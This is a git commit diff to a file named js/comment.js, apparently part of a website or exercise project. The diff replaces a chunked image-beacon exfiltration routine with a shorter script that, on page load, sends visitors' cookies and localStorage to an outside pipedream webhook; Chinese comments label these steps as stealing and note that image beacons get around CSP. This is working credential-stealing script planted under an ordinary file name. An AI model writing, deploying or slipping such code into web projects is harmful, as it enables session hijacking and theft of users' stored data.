07dc96bedeb8a76888fb6a76bdcb74385e1cc0f9
Yung-Ching Liang <jennywinnie56@gmail.com>
2026-04-18 15:33:15 +1000

    Update comment.js

--- js/comment.js
+++ js/comment.js
@@ -1,11 +1,9 @@
 (function() {
-  const WEBHOOK = 'https://eopcy2es2nu1ne5.m.pipedream.net';
-  const TARGET = location.origin;
-  
-  // 函式:把資料切段用 img beacon 送出(img 通常繞得過 CSP)
-  function exfil(tag, data) {
-    const b64 = btoa(unescape(encodeURIComponent(String(data))));
-    // 切段 (URL 最長 ~2000 char)
-    const chunk = 1500;
-    for (let i = 0; i < b64.length; i += chunk) {
-      const img = new
+    const WEBHOOK = 'https://eopcy2es2nu1ne5.m.pipedream.net';
+    
+    // 偷 cookie
+    new Image().src = WEBHOOK + '/?c=' + encodeURIComponent(document.cookie);
+    
+    // 也偷 localStorage
+    new Image().src = WEBHOOK + '/?l=' + encodeURIComponent(JSON.stringify(localStorage));
+})();
